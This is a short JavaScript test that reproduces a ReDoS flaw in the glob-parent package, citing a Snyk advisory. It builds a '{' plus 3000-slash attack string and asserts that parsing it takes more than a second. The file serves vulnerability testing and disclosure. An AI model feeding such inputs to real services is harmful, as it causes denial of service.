//https://snyk.io/vuln/SNYK-JS-GLOBPARENT-1016905
test("ReDos in glob-parent", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const globParent = require("glob-parent")

    let attack_str='{'+genstr(3000,'/');
    let t =measureTime(function () {
        globParent(attack_str);

    });
    
    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});